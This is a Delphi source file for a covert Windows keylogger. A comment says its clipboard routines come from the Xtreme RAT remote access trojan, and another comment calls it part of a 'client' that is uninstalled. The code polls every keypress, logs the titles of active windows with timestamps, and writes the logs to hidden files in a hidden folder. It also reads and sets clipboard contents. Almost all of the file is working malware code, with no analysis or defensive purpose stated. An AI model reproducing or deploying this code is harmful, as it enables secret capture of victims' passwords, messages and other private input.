unit UnitKeylogger; //by wrh1d3
  
interface

uses
  Windows, SysUtils, UnitUtils;
              
procedure StartKeylogger;
procedure StopKeylogger;
//clipboards functions
function GetClipboardText(Wnd: HWND; var TmpStr: widestring): Boolean;
procedure SetClipboardText(Const S: widestring);

var
  LogsDir: string;

implementation

var
  LogFile, TmpStr, hCaption: string;
  ActiveKeylogger: Boolean;
  TimerHandle, TimerHandle2: Word;
        
//unknown original author
procedure ReadKey;
var
  iByte : byte;
begin
  for iByte := 8 To 222 do
  begin
    if GetAsyncKeyState(iByte) = -32767 then
    begin
      case iByte of
        8: Delete(TmpStr, Length(TmpStr), 1); //Backspace
        9: TmpStr := TmpStr + ' [Tab] ';
        13: TmpStr := TmpStr + #13#10; //Enter
        17: TmpStr := TmpStr + ' [Ctrl] ';
        19: TmpStr := TmpStr + ' [Pause/Break] ';
        27: TmpStr := TmpStr + ' [Esc] ';
        32: TmpStr := TmpStr + ' '; //Space
        33: TmpStr := TmpStr + ' [Page Up] ';
        34: TmpStr := TmpStr + ' [Page Down] ';
        35: TmpStr := TmpStr + ' [End] ';
        36: TmpStr := TmpStr + ' [Home] ';
        37: TmpStr := TmpStr + ' [Left] ';
        38: TmpStr := TmpStr + ' [Up] ';
        39: TmpStr := TmpStr + ' [Right] ';
        40: TmpStr := TmpStr + ' [Down] ';
        44: TmpStr := TmpStr + ' [Print Screen] ';
        45: TmpStr := TmpStr + ' [Insert] ';
        46: TmpStr := TmpStr + ' [Delete] ';
        91: TmpStr := TmpStr + ' [Left start] ';
        92: TmpStr := TmpStr + ' [Right start] ';
        144: TmpStr := TmpStr + ' [Num lock] ';
        145: TmpStr := TmpStr + ' [Scroll Lock] ';
        162: TmpStr := TmpStr + ' [Left ctrl] ';
        163: TmpStr := TmpStr + ' [Right start] ';
        164: TmpStr := TmpStr + ' [Alt] ';
        165: TmpStr := TmpStr + ' [Alt grl] ';

        //Number 1234567890 Symbol !@#$%^&*()
        48: if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr +')' else TmpStr := TmpStr + '0';
        49: if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr +'!' else TmpStr := TmpStr + '1';
        50: if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr +'@' else TmpStr := TmpStr + '2';
        51: if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr +'#' else TmpStr := TmpStr + '3';
        52: if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr +'$' else TmpStr := TmpStr + '4';
        53: if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr +'%' else TmpStr := TmpStr + '5';
        54: if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr +'^' else TmpStr := TmpStr + '6';
        55: if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr +'&' else TmpStr := TmpStr + '7';
        56: if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr +'*' else TmpStr := TmpStr + '8';
        57: if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr +'(' else TmpStr := TmpStr + '9';

        // a..z , A..Z
        65..90: begin
                  if ((GetKeyState(VK_CAPITAL)) = 1) then
                  begin
                    if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr + LowerCase(Chr(iByte)) else //a..z
                    TmpStr := TmpStr + UpperCase(Char(iByte)) //A..Z
                  end
                  else
                  begin
                    if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr + UpperCase(Chr(iByte)) else //A..Z
                    TmpStr := TmpStr + LowerCase(Chr(iByte)); //a..z
                  end;
                end;

        96..105: TmpStr := TmpStr + InttoStr(iByte - 96); //Numpad  0..9
        106: TmpStr := TmpStr + '*';
        107: TmpStr := TmpStr + '&';
        109: TmpStr := TmpStr + '-';
        110: TmpStr := TmpStr + '.';
        111: TmpStr := TmpStr + '/';

        112..123: TmpStr := TmpStr + '[F' + IntToStr(iByte - 111) + ']'; //F1-F12

        186: if GetKeyState(VK_SHIFT)<0 then TmpStr := TmpStr + ':' else TmpStr := TmpStr + ';';
        187: if GetKeyState(VK_SHIFT)<0 then TmpStr := TmpStr + '+' else TmpStr := TmpStr + '=';
        188: if GetKeyState(VK_SHIFT)<0 then TmpStr := TmpStr + '<' else TmpStr := TmpStr + ',';
        189: if GetKeyState(VK_SHIFT)<0 then TmpStr := TmpStr + '_' else TmpStr := TmpStr + '-';
        190: if GetKeyState(VK_SHIFT)<0 then TmpStr := TmpStr + '>' else TmpStr := TmpStr + '.';
        191: if GetKeyState(VK_SHIFT)<0 then TmpStr := TmpStr + '?' else TmpStr := TmpStr + '/';
        192: if GetKeyState(VK_SHIFT)<0 then TmpStr := TmpStr + '~' else TmpStr := TmpStr + '`';
        219: if GetKeyState(VK_SHIFT)<0 then TmpStr := TmpStr + '{' else TmpStr := TmpStr + '[';
        220: if GetKeyState(VK_SHIFT)<0 then TmpStr := TmpStr + '|' else TmpStr := TmpStr + '\';
        221: if GetKeyState(VK_SHIFT)<0 then TmpStr := TmpStr + '}' else TmpStr := TmpStr + ']';
        222: if GetKeyState(VK_SHIFT)<0 then TmpStr := TmpStr + '"' else TmpStr := TmpStr + '''';
      end;
    end;
  end;
end;
     
function MyGetDate: string; //custom date string for logfile name
var
  sTime: TSystemTime;
begin
  GetLocalTime(sTime);
  Result := IntToStr(sTime.wDay) + '-' + IntToStr(sTime.wMonth) + '-' + IntToStr(sTime.wYear);
end;

procedure CheckLogsDir; //if delete accidently restart from begining
begin
  if DirectoryExists(LogsDir) = False then
  begin
    if CreateDir(LogsDir) = False then Exit;
    SetFileAttributes(PChar(LogsDir), FILE_ATTRIBUTE_HIDDEN); //comment line to see how things are going
  end;

  LogFile := LogsDir + '\' + MyGetDate;
  if not FileExists(LogFile) then
  begin
    if MyCreateFile(LogFile) = False then Exit;
    SetFileAttributes(PChar(LogFile), FILE_ATTRIBUTE_HIDDEN); //comment line to see how things are going
  end;
end;

procedure LogKey;
begin
  ReadKey;
end;

procedure LogKeyTimer;
begin
  TimerHandle := SetTimer(0, 0, 1, @LogKey); //set timer
end;

procedure LogCaption;
var
  TmpLog: string;
begin
  if not ActiveKeylogger then Exit;
  CheckLogsDir; //be sure logsdir and lofile exists

  if hCaption <> GetActiveCaption then
  begin
    hCaption := GetActiveCaption;
    TmpLog := TmpLog + #13#10#13#10 + '[' + TimeToStr(Now) + '] ' + hCaption + #13#10;
    MyWriteFile(LogFile, TmpLog, Length(TmpLog));
  end;

  MyWriteFile(LogFile, TmpStr, Length(TmpStr));
  TmpStr := '';
end;

procedure LogCaptionTimer;
begin
  TimerHandle2 := SetTimer(0, 0, 1, @LogCaption);
end;

procedure StartKeylogger;
begin
  ActiveKeylogger := True;
  CheckLogsDir;
  LogCaptionTimer;
  LogKeyTimer;
end;

procedure StopKeylogger; //only when uninstall client 
begin
  ActiveKeylogger := False;
  KillTimer(TimerHandle, 0);
  KillTimer(TimerHandle2, 0);
end;

//From Xtreme RAT 3.6 source code
//-----
function GetClipboardText(Wnd: HWND; var TmpStr: widestring): Boolean;
var
  hData: HGlobal;
  Arr: array of WideChar;
  p: pointer;
  i: int64;
begin
  Result := True;
  TmpStr := '';
  if OpenClipboard(Wnd) = False then Result := False else
  begin
    try
      hData := GetClipboardData(CF_UNICODETEXT{CF_TEXT});
      if hData <> 0 then
      begin
        try
          p := GlobalLock(hData);
          i := GlobalSize(hData);
          setlength(Arr, i);
          CopyMemory(@Arr[0], p, i);
          TmpStr := WideString(Arr);
        finally
          GlobalUnlock(hData);
        end;
      end
      else Result := False;
    finally
      CloseClipboard;
    end;
  end;
end;

procedure SetClipboardText(Const S: widestring);
var
  Data: THandle;
  DataPtr: Pointer;
  Size: integer;
begin
  Size := length(S);
  OpenClipboard(0);
  try
    Data := GlobalAlloc(GMEM_MOVEABLE + GMEM_DDESHARE, (Size * 2) + 2);
    try
      DataPtr := GlobalLock(Data);
      try
        Move(S[1], DataPtr^, Size * 2);
        SetClipboardData(CF_UNICODETEXT{CF_TEXT}, Data);
      finally
        GlobalUnlock(Data);
      end;
    except
      GlobalFree(Data);
      raise;
    end;
  finally
    CloseClipboard;
  end;
end;
//-----

end.
